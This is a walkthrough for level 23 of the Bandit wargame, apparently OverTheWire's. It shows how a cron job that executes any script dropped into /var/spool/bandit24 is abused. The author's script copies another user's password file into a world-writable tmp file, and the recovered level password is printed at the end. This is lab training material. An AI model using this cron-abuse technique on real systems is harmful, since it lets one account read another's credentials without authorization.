# Bandit Level 23

Again this is another cronjob challenge so we will navigate to the `/etc/cron.d` directory and look at the `cronjob_bandit24` file

We can again inspect the `.sh` file to give the shellcode:
```sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

here we see that it is running all code in `/var/spool/$bandit24` every minite or so

first of all we need to write our own shellscript
It goes as follows:
```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/thisdirisours/passwd
```

after writing this in our tmp directory with the extension .sh we need to set permissions for the file
We want everone to do everything so we can use the command
> `chmod 777 ourshellcode.sh`

Now we create the file we said to pipe redirect the output of the command to in our shellcode using `touch passwd` which will create our password file

We also need to set the correct permissions on this one also as we need all users to be able to write to it so we use the command:
> `chmod 666 passwd`

allowing all users to read and write to it

Now we just copy our shellscript into `/var/spool/bandit24` and wait

After a certain amount of time you should see our password file now has data in and when opened with the `cat` command we see the password is: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

